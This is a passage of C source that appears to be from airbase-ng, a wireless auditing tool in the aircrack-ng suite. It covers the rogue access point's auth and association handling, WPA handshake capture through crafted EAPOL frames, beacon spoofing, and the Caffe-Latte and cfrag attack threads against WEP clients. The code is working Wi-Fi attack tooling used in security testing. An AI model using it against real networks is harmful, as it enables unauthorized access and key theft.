						PCT;
						printf("Got an auth request from "
							   "%02X:%02X:%02X:%02X:%02X:%02X (open system)\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5]);
					}
					memcpy(packet + 4, smac, 6);
					memcpy(packet + 10, dmac, 6);
					packet[z + 2] = 0x02;

					if (lopt.forceska)
					{
						packet[z] = 0x01;
						packet[z + 4] = 13;
					}

					my_send_packet(packet, length);

					return (0);
				}
			}
			else // shared key auth
			{
				// first response
				if (packet[z + 2] == 0x01 && (packet[1] & 0x40) == 0x00)
				{
					if (opt.verbose)
					{
						PCT;
						printf("Got an auth request from "
							   "%02X:%02X:%02X:%02X:%02X:%02X (shared key)\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5]);
					}
					memcpy(packet + 4, smac, 6);
					memcpy(packet + 10, dmac, 6);
					packet[z + 2] = 0x02;

					remaining = lopt.skalen;

					while (remaining > 0)
					{
						bytes2use = MIN((uint8_t) 255u, (uint8_t) remaining);
						remaining -= bytes2use;
						// add challenge
						packet[length] = 0x10;
						packet[length + 1] = bytes2use;
						length += 2;

						for (i = 0; i < bytes2use; i++)
						{
							packet[length + i] = rand_u8();
						}

						length += bytes2use;
					}
					my_send_packet(packet, length);
					check_shared_key(packet, length);

					return (0);
				}

				// second response
				if ((packet[1] & 0x40) == 0x40)
				{
					check_shared_key(packet, length);
					packet[1] = 0x00; // not encrypted
					memcpy(packet + 4, smac, 6);
					memcpy(packet + 10, dmac, 6);

					packet[z] = 0x01; // shared key
					packet[z + 1] = 0x00; //-V525
					packet[z + 2] = 0x04; // sequence 4
					packet[z + 3] = 0x00;
					packet[z + 4] = 0x00; // successful
					packet[z + 5] = 0x00;

					length = z + 6;
					my_send_packet(packet, length);
					check_shared_key(packet, length);
					if (!opt.quiet) PCT;
					printf("SKA from %02X:%02X:%02X:%02X:%02X:%02X\n",
						   smac[0],
						   smac[1],
						   smac[2],
						   smac[3],
						   smac[4],
						   smac[5]);
				}
			}
		}

		// asso req or reasso
		if (((packet[0] & IEEE80211_FC0_SUBTYPE_MASK)
				 == IEEE80211_FC0_SUBTYPE_ASSOC_REQ
			 || (packet[0] & IEEE80211_FC0_SUBTYPE_MASK)
					== IEEE80211_FC0_SUBTYPE_REASSOC_REQ)
			&& memcmp(bssid, opt.r_bssid, 6) == 0)
		{
			if ((packet[0] & IEEE80211_FC0_SUBTYPE_MASK)
				== IEEE80211_FC0_SUBTYPE_ASSOC_REQ)
			{
				// asso req
				reasso = 0; //-V1048
				fixed = 4;
			}
			else // reassociation frame
			{
				reasso = 1;
				fixed = 10;
			}

			st_cur->wep = (packet[z] & 0x10) >> 4;

			// Check SSID is present
			tag = parse_tags(packet + z + fixed,
							 IEEE80211_ELEMID_SSID,
							 (int) (length - z - fixed),
							 &len);
			if (tag != NULL && tag[0] >= 32 && len < 256)
			{
				memcpy(essid, tag, len);
				essid[len] = 0x00;
				if (lopt.f_essid && !gotESSID((char *) essid, (int) len))
					return (0);
			}

			st_cur->wpatype = 0;
			st_cur->wpahash = 0;

			// Search for WPA IE, which is inside a Vendor Specific (221, 0xDD) and parse client's WPA IE
			tag = parse_tags(packet + z + fixed,
							 IEEE80211_ELEMID_VENDOR,
							 (int) (length - z - fixed),
							 &len);
			while (tag != NULL)
			{
				wpa_client(st_cur, tag - 2, (int) (len + 2u));
				tag += (tag - 2)[1] + 2;
				tag = parse_tags(tag - 2,
								 IEEE80211_ELEMID_VENDOR,
								 (int) (length - (tag - packet) + 2u),
								 &len);
			}

			// Search for RSN IE and parse client's RSN IE
			tag = parse_tags(packet + z + fixed,
							 IEEE80211_ELEMID_RSN,
							 (int) (length - z - fixed),
							 &len);
			while (tag != NULL)
			{
				wpa_client(st_cur, tag - 2, (int) (len + 2u));
				tag += (tag - 2)[1] + 2;
				tag = parse_tags(tag - 2,
								 IEEE80211_ELEMID_RSN,
								 (int) (length - (tag - packet) + 2u),
								 &len);
			}

			// Set type/subtype depending on the frame received
			if (!reasso)
				packet[0]
					= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_RESP;
			else
				packet[0] = IEEE80211_FC0_TYPE_MGT
							| IEEE80211_FC0_SUBTYPE_REASSOC_RESP;

			// Add the addresses
			memcpy(packet + 4, smac, 6);
			memcpy(packet + 10, dmac, 6);

			// store the tagged parameters and insert the fixed ones
			buffer = (unsigned char *) malloc(length - z - fixed);
			ALLEGE(buffer != NULL);
			memcpy(buffer, packet + z + fixed, length - z - fixed);

			packet[z + 2] = 0x00;
			packet[z + 3] = 0x00;
			packet[z + 4] = 0x01;
			packet[z + 5] = 0xC0;

			memcpy(packet + z + 6, buffer, length - z - fixed);
			length += (6 - fixed);
			free(buffer);
			buffer = NULL;

			len = length - z - 6;

			// Remove SSID
			remove_tag(packet + z + 6, IEEE80211_ELEMID_SSID, &len);

			// Remove Supported Operating Classes (59)
			remove_tag(packet + z + 6, 59, &len);

			// Remove WPA tag (Vendor Specific) - It will also remove other vendor tags which aren't needed
			remove_tag(packet + z + 6, IEEE80211_ELEMID_VENDOR, &len);

			// Remove RSN tag
			remove_tag(packet + z + 6, IEEE80211_ELEMID_RSN, &len);

			// Recalculate length
			length = len + z + 6;

			my_send_packet(packet, length);
			if (!opt.quiet)
			{
				PCT;
				printf("Client %02X:%02X:%02X:%02X:%02X:%02X %sassociated",
					   smac[0],
					   smac[1],
					   smac[2],
					   smac[3],
					   smac[4],
					   smac[5],
					   (reasso == 0) ? "" : "re");
				if (st_cur->wpatype != 0)
				{
					if (st_cur->wpatype == 1)
						printf(" (WPA1");
					else
						printf(" (WPA2");

					if (st_cur->wpahash == 1)
						printf(";TKIP)");
					else
						printf(";CCMP)");
				}
				else if (st_cur->wep != 0)
				{
					printf(" (WEP)");
				}
				else
				{
					printf(" (unencrypted)");
				}

				if (essid[0] != 0x00) printf(" to ESSID: \"%s\"", essid);
				printf("\n");
			}

			memset(st_cur->essid, 0, ESSID_LENGTH + 1);
			memcpy(st_cur->essid, essid, ESSID_LENGTH + 1);
			st_cur->essid_length = (int) ustrlen(essid);

			memset(essid, 0, sizeof(essid)); //-V597

			/* either specified or determined */
			if ((lopt.sendeapol && (lopt.wpa1type || lopt.wpa2type))
				|| (st_cur->wpatype && st_cur->wpahash))
			{
				st_cur->wpa.state = 0;

				if (lopt.use_fixed_nonce)
				{
					memcpy(st_cur->wpa.anonce, lopt.fixed_nonce, 32);
				}
				else
				{
					for (i = 0; i < 32; i++) st_cur->wpa.anonce[i] = rand_u8();
				}

				st_cur->wpa.state |= 1;

				/* build first eapol frame */
				memcpy(h80211, "\x08\x02\xd5\x00", 4);
				len = 4;

				memcpy(h80211 + len, smac, 6);
				len += 6;
				memcpy(h80211 + len, bssid, 6);
				len += 6;
				memcpy(h80211 + len, bssid, 6);
				len += 6;

				h80211[len] = 0x60;
				h80211[len + 1] = 0x0f;
				len += 2;

				// llc+snap
				memcpy(h80211 + len, "\xAA\xAA\x03\x00\x00\x00\x88\x8E", 8);
				len += 8;

				// eapol
				memset(h80211 + len, 0, 99);
				h80211[len] = 0x01; // version
				h80211[len + 1] = 0x03; // type
				h80211[len + 2] = 0x00;
				h80211[len + 3] = 0x5F; // len
				if (lopt.wpa1type) h80211[len + 4] = 0xFE; // WPA1

				if (lopt.wpa2type) h80211[len + 4] = 0x02; // WPA2

				if (!lopt.wpa1type && !lopt.wpa2type)
				{
					if (st_cur->wpatype == 1) // WPA1
						h80211[len + 4] = 0xFE; // WPA1
					else
						h80211[len + 4] = 0x02; // WPA2
				}

				if (lopt.sendeapol >= 1 && lopt.sendeapol <= 2) // specified
				{
					if (lopt.sendeapol == 1) // MD5
					{
						h80211[len + 5] = 0x00;
						h80211[len + 6] = 0x89;
					}
					else // SHA1
					{
						h80211[len + 5] = 0x00;
						h80211[len + 6] = 0x8a;
					}
				}
				else // from asso
				{
					if (st_cur->wpahash == 1) // MD5
					{
						h80211[len + 5] = 0x00;
						h80211[len + 6] = 0x89;
					}
					else if (st_cur->wpahash == 2) // SHA1
					{
						h80211[len + 5] = 0x00;
						h80211[len + 6] = 0x8a;
					}
				}

				h80211[len + 7] = 0x00;
				h80211[len + 8] = 0x20; // keylen

				memset(h80211 + len + 9, 0, 90);
				memcpy(h80211 + len + 17, st_cur->wpa.anonce, 32);

				len += 99;

				my_send_packet(h80211, len);
			}

			return (0);
		}

		return (0);
	}

	return (0);
}

static THREAD_ENTRY(beacon_thread)
{
	REQUIRE(arg != NULL);

	struct AP_conf apc;
	struct timeval tv, tv1, tv2;
	u_int64_t timestamp;
	uint8_t beacon[512];
	size_t beacon_len = 0;
	int seq = 0, i = 0, n = 0;
	size_t essid_len;
	int temp_channel;
	uint8_t essid[MAX_IE_ELEMENT_SIZE + 1];
	float f, ticks[3];
	ssize_t rc;

	memset(essid, 0, MAX_IE_ELEMENT_SIZE + 1);
	memcpy(&apc, arg, sizeof(struct AP_conf));

	ticks[0] = 0;
	ticks[1] = 0;
	ticks[2] = 0;

	while (1)
	{
		/* sleep until the next clock tick */
		if (dev.fd_rtc >= 0)
		{
			if ((rc = read(dev.fd_rtc, &n, sizeof(n))) < 0)
			{
				perror("read(/dev/rtc) failed");
				return (NULL);
			}

			if (rc == 0)
			{
				perror("EOF encountered on /dev/rtc");
				return (NULL);
			}

			ticks[0]++;
			ticks[1]++;
			ticks[2]++;
		}
		else
		{
			gettimeofday(&tv, NULL);
			usleep(1000000 / RTC_RESOLUTION);
			gettimeofday(&tv2, NULL);

			f = 1000000.0f * (float) (tv2.tv_sec - tv.tv_sec)
				+ (float) (tv2.tv_usec - tv.tv_usec);

			ticks[0] += f / (1000000.f / RTC_RESOLUTION);
			ticks[1] += f / (1000000.f / RTC_RESOLUTION);
			ticks[2] += f / (1000000.f / RTC_RESOLUTION);
		}

		if (((double) ticks[2] / (double) RTC_RESOLUTION)
			>= ((double) apc.interval / 1000.0) * (double) seq)
		{
			/* threshold reach, send one frame */
			//             ticks[2] = 0;
			fflush(stdout);
			gettimeofday(&tv1, NULL);
			timestamp = tv1.tv_sec * 1000000UL + tv1.tv_usec;
			fflush(stdout);

			/* flush expired ESSID entries */
			flushESSID();
			essid_len = (size_t) getNextESSID((char *) essid);
			if (!essid_len)
			{
				strncpy((char *) essid, "default", sizeof(essid) - 1);
				essid_len = strlen("default"); //-V814
			}

			beacon_len = 0;

			memcpy(beacon,
				   "\x80\x00\x00\x00",
				   4); // type/subtype/framecontrol/duration
			beacon_len += 4;
			memcpy(beacon + beacon_len, BROADCAST, 6); // destination
			beacon_len += 6;
			if (!lopt.adhoc)
				memcpy(beacon + beacon_len, apc.bssid, 6); // source
			else
				memcpy(beacon + beacon_len, opt.r_smac, 6); // source
			beacon_len += 6;
			memcpy(beacon + beacon_len, apc.bssid, 6); // bssid
			beacon_len += 6;
			memcpy(beacon + beacon_len, "\x00\x00", 2); // seq+frag
			beacon_len += 2;

			memcpy(beacon + beacon_len,
				   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
				   12); // fixed information

			beacon[beacon_len + 8]
				= (uint8_t)((apc.interval * MAX(getESSIDcount(), 1))
							& 0xFF); // beacon interval
			beacon[beacon_len + 9] = (uint8_t)(
				((apc.interval * MAX(getESSIDcount(), 1)) >> 8) & 0xFF);
			memcpy(beacon + beacon_len + 10, apc.capa, 2); // capability
			beacon_len += 12;

			beacon[beacon_len] = 0x00; // essid tag
			beacon[beacon_len + 1] = (uint8_t) essid_len; // essid tag
			beacon_len += 2;
			memcpy(beacon + beacon_len, essid, essid_len); // actual essid
			beacon_len += essid_len;

			memcpy(beacon + beacon_len, RATES, sizeof(RATES) - 1); // rates
			beacon_len += sizeof(RATES) - 1;

			beacon[beacon_len] = 0x03; // channel tag
			beacon[beacon_len + 1] = 0x01;
			temp_channel = wi_get_channel(_wi_in); // current channel
			if (!invalid_channel_displayed)
			{
				if (temp_channel > 255)
				{
					// Display error message once
					invalid_channel_displayed = 1;
					fprintf(stderr,
							"Error: Got channel %d, expected a value < 256.\n",
							temp_channel);
				}
				else if (temp_channel < 1)
				{
					invalid_channel_displayed = 1;
					fprintf(stderr,
							"Error: Got channel %d, expected a value > 0.\n",
							temp_channel);
				}
			}
			beacon[beacon_len + 2] = (uint8_t)(
				((temp_channel > 255 || temp_channel < 1) && lopt.channel != 0)
					? lopt.channel
					: temp_channel);

			beacon_len += 3;

			if (lopt.allwpa)
			{
				memcpy(beacon + beacon_len,
					   ALL_WPA2_TAGS,
					   sizeof(ALL_WPA2_TAGS) - 1);
				beacon_len += sizeof(ALL_WPA2_TAGS) - 1;
			}
			else if (lopt.wpa2type > 0)
			{
				memcpy(beacon + beacon_len, WPA2_TAG, 22);
				beacon[beacon_len + 7] = (uint8_t) lopt.wpa2type;
				beacon[beacon_len + 13] = (uint8_t) lopt.wpa2type;
				beacon_len += 22;
			}

			// Add extended rates
			memcpy(beacon + beacon_len,
				   EXTENDED_RATES,
				   sizeof(EXTENDED_RATES) - 1);
			beacon_len += sizeof(EXTENDED_RATES) - 1;

			if (lopt.allwpa)
			{
				memcpy(beacon + beacon_len,
					   ALL_WPA1_TAGS,
					   sizeof(ALL_WPA1_TAGS) - 1);
				beacon_len += sizeof(ALL_WPA1_TAGS) - 1;
			}
			else if (lopt.wpa1type > 0)
			{
				memcpy(beacon + beacon_len, WPA1_TAG, 24);
				beacon[beacon_len + 11] = (uint8_t) lopt.wpa1type;
				beacon[beacon_len + 17] = (uint8_t) lopt.wpa1type;
				beacon_len += 24;
			}

			// copy timestamp into beacon; a mod 2^64 counter incremented each
			// microsecond
			for (i = 0; i < 8; i++)
			{
				beacon[24 + i] = (uint8_t)((timestamp >> (i * 8)) & 0xFF);
			}

			beacon[22] = (uint8_t)((seq << 4) & 0xFF);
			beacon[23] = (uint8_t)((seq >> 4) & 0xFF);

			fflush(stdout);

			if (my_send_packet(beacon, beacon_len) < 0)
			{
				printf("Error sending beacon!\n");
				return (NULL);
			}

			seq++;
		}
	}

	return (NULL);
}

static THREAD_ENTRY(caffelatte_thread)
{
	struct timeval tv, tv2;
	float f, ticks[3];
	int arp_off1 = 0;
	int nb_pkt_sent_1 = 0;
	int seq = 0;

	UNUSED_PARAM(arg);

	ticks[0] = 0;
	ticks[1] = 0;
	ticks[2] = 0;

	while (1)
	{
		/* sleep until the next clock tick */
		gettimeofday(&tv, NULL);
		usleep(1000000 / RTC_RESOLUTION);
		gettimeofday(&tv2, NULL);

		f = 1000000.0f * (float) (tv2.tv_sec - tv.tv_sec)
			+ (float) (tv2.tv_usec - tv.tv_usec);

		ticks[0] += f / (1000000.f / RTC_RESOLUTION);
		ticks[1] += f / (1000000.f / RTC_RESOLUTION);
		ticks[2] += f / (1000000.f / RTC_RESOLUTION);

		if (((double) ticks[2] / (double) RTC_RESOLUTION)
			>= (1000.0 / (double) opt.r_nbpps) * (double) seq)
		{
			/* threshold reach, send one frame */
			//            ticks[2] = 0;

			if (lopt.nb_arp > 0)
			{
				if (nb_pkt_sent_1 == 0) ticks[0] = 0;

				if (my_send_packet(arp[arp_off1].buf,
								   (size_t) arp[arp_off1].len)
					< 0)
					return (NULL);

				nb_pkt_sent_1++;

				if (((double) ticks[0] / (double) RTC_RESOLUTION)
						* (double) opt.r_nbpps
					> (double) nb_pkt_sent_1)
				{
					if (my_send_packet(arp[arp_off1].buf,
									   (size_t) arp[arp_off1].len)
						< 0)
						return (NULL);

					nb_pkt_sent_1++;
				}

				if (++arp_off1 >= lopt.nb_arp) arp_off1 = 0;
			}
		}
	}

	return (NULL);
}

static int del_next_CF(pCF_t curCF)
{
	pCF_t tmp;

	if (curCF == NULL) return (1);
	if (curCF->next == NULL) return (1);

	tmp = curCF->next;
	curCF->next = tmp->next;

	free(tmp);

	return (0);
}

static int cfrag_fuzz(unsigned char * packet,
					  int frags,
					  int frag_num,
					  int length,
					  const unsigned char rnd[2])
{
	int z, i;
	unsigned char overlay[4096];
	unsigned char * smac = NULL;

	if (packet == NULL) return (1);

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if (length <= z + 8) return (1);

	if (frags < 1) return (1);

	if (frag_num < 0 || frag_num > frags) return (1);

	if ((packet[1] & 3) <= 1)
		smac = packet + 10;
	else if ((packet[1] & 3) == 2)
		smac = packet + 16;
	else
		smac = packet + 24;

	memset(overlay, 0, 4096);

	smac[4] ^= rnd[0];
	smac[5] ^= rnd[1];

	if (frags == 1 && frag_num == 1) /* ARP final */
	{
		overlay[z + 14] = rnd[0];
		overlay[z + 15] = rnd[1];
		overlay[z + 18] = rnd[0];
		overlay[z + 19] = rnd[1];
		add_crc32_plain(overlay + z + 4, length - z - 4 - 4);
	}
	else if (frags == 3 && frag_num == 3) /* IP final */
	{
		overlay[z + 12] = rnd[0];
		overlay[z + 13] = rnd[1];
		overlay[z + 16] = rnd[0];
		overlay[z + 17] = rnd[1];
		add_crc32_plain(overlay + z + 4, length - z - 4 - 4);
	}

	for (i = 0; i < length; i++)
	{
		packet[i] ^= overlay[i];
	}

	return (0);
}

static THREAD_ENTRY(cfrag_thread)
{
	struct timeval tv, tv2;
	float f, ticks[3];
	int nb_pkt_sent_1 = 0;
	int seq = 0, i = 0;
	pCF_t curCF;
	unsigned char rnd[2];
	unsigned char buffer[4096];

	UNUSED_PARAM(arg);

	ticks[0] = 0;
	ticks[1] = 0;
	ticks[2] = 0;

	while (1)
	{
		/* sleep until the next clock tick */
		gettimeofday(&tv, NULL);
		usleep(1000000 / RTC_RESOLUTION);
		gettimeofday(&tv2, NULL);

		f = 1000000.0f * (float) (tv2.tv_sec - tv.tv_sec)
			+ (float) (tv2.tv_usec - tv.tv_usec);

		ticks[0] += f / (1000000.f / RTC_RESOLUTION);
		ticks[1] += f / (1000000.f / RTC_RESOLUTION);
		ticks[2] += f / (1000000.f / RTC_RESOLUTION);

		if (((double) ticks[2] / (double) RTC_RESOLUTION)
			>= ((double) 1000.0 / (double) opt.r_nbpps) * (double) seq)
		{
			/* threshold reach, send one frame */
			//            ticks[2] = 0;

			ALLEGE(pthread_mutex_lock(&mx_cf) == 0);

			if (lopt.cf_count > 0)
			{
				curCF = rCF;

				if (curCF->next == NULL)
				{
					lopt.cf_count = 0;
					ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
					continue;
				}

				while (curCF->next != NULL
					   && curCF->next->xmitcount >= MAX_CF_XMIT)
				{
					del_next_CF(curCF);
				}

				if (curCF->next == NULL)
				{
					lopt.cf_count = 0;
					ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
					continue;
				}

				curCF = curCF->next;

				if (nb_pkt_sent_1 == 0) ticks[0] = 0;

				rnd[0] = rand_u8();
				rnd[1] = rand_u8();

				for (i = 0; i < curCF->fragnum; i++)
				{
					memcpy(buffer, curCF->frags[i], curCF->fraglen[i]);
					cfrag_fuzz(buffer,
							   curCF->fragnum,
							   i,
							   (int) curCF->fraglen[i],
							   rnd);
					if (my_send_packet(buffer, curCF->fraglen[i]) < 0)
					{
						ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
						return (NULL);
					}
				}
				memcpy(buffer, curCF->final, curCF->finallen);
				cfrag_fuzz(buffer,
						   curCF->fragnum,
						   curCF->fragnum,
						   (int) curCF->finallen,
						   rnd);
				if (my_send_packet(buffer, curCF->finallen) < 0)
				{
					ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
					return (NULL);
				}

				curCF->xmitcount++;
				nb_pkt_sent_1++;

				if (((double) ticks[0] / (double) RTC_RESOLUTION)
						* (double) opt.r_nbpps
					> (double) nb_pkt_sent_1)
				{
					rnd[0] = rand_u8();
					rnd[1] = rand_u8();
					for (i = 0; i < curCF->fragnum; i++)
					{
						memcpy(buffer, curCF->frags[i], curCF->fraglen[i]);
						cfrag_fuzz(buffer,
								   curCF->fragnum,
								   i,
								   (int) curCF->fraglen[i],
								   rnd);
						if (my_send_packet(buffer, curCF->fraglen[i]) < 0)
						{
							ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
							return (NULL);
						}
					}
					memcpy(buffer, curCF->final, curCF->finallen);
					cfrag_fuzz(buffer,
							   curCF->fragnum,
							   curCF->fragnum,
							   (int) curCF->finallen,
							   rnd);
					if (my_send_packet(buffer, curCF->finallen) < 0)
					{
						ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
						return (NULL);
					}

					curCF->xmitcount++;
					nb_pkt_sent_1++;
				}
			}
			ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);
		}
	}

	return (NULL);
}

int main(int argc, char * argv[])
{
	int ret_val, len, i, n;
	unsigned int un;
	struct pcap_pkthdr pkh;
	fd_set read_fds;
	unsigned char buffer[4096];
	char *s, buf[128], *tempstr;
	int caplen;
	struct AP_conf apc;
	unsigned char mac[6];

	/* check the arguments */

	memset(&opt, 0, sizeof(opt));
	memset(&dev, 0, sizeof(dev));
	memset(&apc, 0, sizeof(struct AP_conf));

	ALLEGE(pthread_mutex_init(&rESSIDmutex, NULL) == 0);
	rESSID = (pESSID_t) malloc(sizeof(struct ESSID_list));
	ALLEGE(rESSID != NULL);
	memset(rESSID, 0, sizeof(struct ESSID_list));

	rFragment = (pFrag_t) malloc(sizeof(struct Fragment_list));
	ALLEGE(rFragment != NULL);
	memset(rFragment, 0, sizeof(struct Fragment_list));

	rClient = (pMAC_t) malloc(sizeof(struct MAC_list));
	ALLEGE(rClient != NULL);
	memset(rClient, 0, sizeof(struct MAC_list));

	rBSSID = (pMAC_t) malloc(sizeof(struct MAC_list));
	ALLEGE(rBSSID != NULL);
	memset(rBSSID, 0, sizeof(struct MAC_list));

	rCF = (pCF_t) malloc(sizeof(struct CF_packet));
	ALLEGE(rCF != NULL);
	memset(rCF, 0, sizeof(struct CF_packet));

	ac_crypto_init();

	ALLEGE(pthread_mutex_init(&mx_cf, NULL) == 0);
	ALLEGE(pthread_mutex_init(&mx_cap, NULL) == 0);

	opt.r_nbpps = 100;
	lopt.tods = 0;
	lopt.setWEP = -1;
	lopt.skalen = 128;
	lopt.filter = -1;
	opt.ringbuffer = 10;
	lopt.nb_arp = 0;
	opt.f_index = 1;
	lopt.interval = 0x64;
	lopt.channel = 0;
	lopt.beacon_cache = 0; /* disable by default */
	lopt.use_fixed_nonce = 0;
	lopt.ti_mtu = TI_MTU;
	lopt.wif_mtu = WIF_MTU;
	invalid_channel_displayed = 0;

	rand_init();

	while (1)
	{
		int option_index = 0;

		static const struct option long_options[]
			= {{"beacon-cache", 1, 0, 'C'},
			   {"bssid", 1, 0, 'b'},
			   {"bssids", 1, 0, 'B'},
			   {"channel", 1, 0, 'c'},
			   {"client", 1, 0, 'd'},
			   {"clients", 1, 0, 'D'},
			   {"essid", 1, 0, 'e'},
			   {"essids", 1, 0, 'E'},
			   {"promiscuous", 0, 0, 'P'},
			   {"interval", 1, 0, 'I'},
			   {"mitm", 0, 0, 'M'},
			   {"hidden", 0, 0, 'X'},
			   {"caffe-latte", 0, 0, 'L'},
			   {"cfrag", 0, 0, 'N'},
			   {"verbose", 0, 0, 'v'},
			   {"ad-hoc", 0, 0, 'A'},
			   {"help", 0, 0, 'H'},
			   {0, 0, 0, 0}};

		int option = getopt_long(
			argc,
			argv,
			"a:h:i:C:I:r:w:HPe:E:c:d:D:f:W:qMY:b:B:XsS:Lx:vAz:Z:yV:0NF:n:",
			long_options,
			&option_index);

		if (option < 0) break;

		switch (option)
		{
			case 0:

				break;

			case ':':
			case '?':

				printf("\"%s --help\" for help.\n", argv[0]);
				return (EXIT_FAILURE);

			case 'n':

				// Check the value is 32 bytes, in hex (64 hex)
				if (hexStringToArray(
						optarg, (int) strlen(optarg), lopt.fixed_nonce, 32)
					!= 32)
				{
					printf("Invalid fixed nonce. It must be 64 hexadecimal "
						   "chars.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				lopt.use_fixed_nonce = 1;
				break;

			case 'a':

				if (getmac(optarg, 1, opt.r_bssid) != 0)
				{
					printf("Invalid AP MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				break;

			case 'c':

				lopt.channel = atoi(optarg);
				if (lopt.channel > 255 || lopt.channel < 1)
				{
					printf("Invalid channel value <%d>. It must be between 1 "
						   "and 255.\n",
						   lopt.channel);
					return (EXIT_FAILURE);
				}

				break;

			case 'V':

				lopt.sendeapol = atoi(optarg);
				if (lopt.sendeapol < 1 || lopt.sendeapol > 3)
				{
					printf("EAPOL value can only be 1[MD5], 2[SHA1] or "
						   "3[auto].\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 'v':

				opt.verbose = 1;
				if (opt.quiet != 0)
				{
					printf("Don't specify -v and -q at the same time.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 'z':

				lopt.wpa1type = atoi(optarg);
				if (lopt.wpa1type < 1 || lopt.wpa1type > 5)
				{
					printf("Invalid WPA1 type [1-5]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				if (lopt.setWEP == -1)
				{
					lopt.setWEP = 1;
				}

				break;

			case 'Z':

				lopt.wpa2type = atoi(optarg);
				if (lopt.wpa2type < 1 || lopt.wpa2type > 5)
				{
					printf("Invalid WPA2 type [1-5]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				if (lopt.setWEP == -1)
				{
					lopt.setWEP = 1;
				}

				break;

			case 'e':

				if (addESSID(optarg, (int) strlen(optarg), 0) != 0)
				{
					printf("Invalid ESSID, too long\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				lopt.f_essid = 1;

				break;

			case 'E':

				if (addESSIDfile(optarg) != 0) return (EXIT_FAILURE);

				lopt.f_essid = 1;

				break;

			case 'P':

				lopt.promiscuous = 1;

				break;

			case 'I':

				lopt.interval = atoi(optarg);

				break;

			case 'C':

				lopt.beacon_cache = atoi(optarg);

				break;

			case 'A':

				lopt.adhoc = 1;

				break;

			case 'N':

				lopt.cf_attack = 1;

				break;

			case 'X':

				lopt.hidden = 1;

				break;

			case '0':

				lopt.allwpa = 1;
				if (lopt.sendeapol == 0) lopt.sendeapol = 3;

				break;

			case 'x':

				opt.r_nbpps = atoi(optarg);
				if (opt.r_nbpps < 1 || opt.r_nbpps > 1000)
				{
					printf("Invalid speed. [1-1000]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 's':

				lopt.forceska = 1;

				break;

			case 'f':

				if (strncasecmp(optarg, "allow", 5) == 0
					|| strncmp(optarg, "0", 1) == 0)
				{
					lopt.filter
						= ALLOW_MACS; // block all, allow the specified macs
				}
				else if (strncasecmp(optarg, "disallow", 8) == 0
						 || strncmp(optarg, "1", 1) == 0)
				{
					lopt.filter
						= BLOCK_MACS; // allow all, block the specified macs
				}
				else
				{
					printf("Invalid macfilter mode. [allow|disallow]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 'S':

				if (atoi(optarg) < 16 || atoi(optarg) > 1480)
				{
					printf("Invalid challenge length. [16-1480]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				lopt.skalen = atoi(optarg);

				break;

			case 'h':

				if (getmac(optarg, 1, opt.r_smac) != 0)
				{
					printf("Invalid source MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				break;

			case 'i':

				if (opt.s_face != NULL || opt.s_file)
				{
					printf("Packet source already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				opt.s_face = optarg;
				break;

			case 'W':

				if (atoi(optarg) < 0 || atoi(optarg) > 1)
				{
					printf("Invalid argument for (-W). Only \"0\" and \"1\" "
						   "allowed.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				lopt.setWEP = atoi(optarg);

				break;

			case 'M':

				lopt.mitm = 1;

				break;

			case 'L':

				lopt.caffelatte = 1;

				break;

			case 'y':

				lopt.nobroadprobe = 1;

				break;

			case 'Y':

				if (strncasecmp(optarg, "in", 2) == 0)
				{
					lopt.external |= EXT_IN; // process incoming frames
				}
				else if (strncasecmp(optarg, "out", 3) == 0)
				{
					lopt.external |= EXT_OUT; // process outgoing frames
				}
				else if (strncasecmp(optarg, "both", 4) == 0
						 || strncasecmp(optarg, "all", 3) == 0)
				{
					lopt.external
						|= EXT_IN | EXT_OUT; // process both directions
				}
				else
				{
					printf("Invalid processing mode. [in|out|both]\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 'q':

				opt.quiet = 1;
				if (opt.verbose != 0)
				{
					printf("Don't specify -v and -q at the same time.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				break;

			case 'w':

				if (opt.prga != NULL)
				{
					printf("PRGA file already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				if (opt.crypt != CRYPT_NONE)
				{
					printf("Encryption key already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				opt.crypt = CRYPT_WEP;

				i = 0;
				s = optarg;

				buf[0] = s[0];
				buf[1] = s[1];
				buf[2] = '\0';

				while (sscanf(buf, "%x", &un) == 1)
				{
					if (un > 255)
					{
						printf("Invalid WEP key.\n");
						printf("\"%s --help\" for help.\n", argv[0]);
						return (EXIT_FAILURE);
					}

					opt.wepkey[i++] = (uint8_t) un;

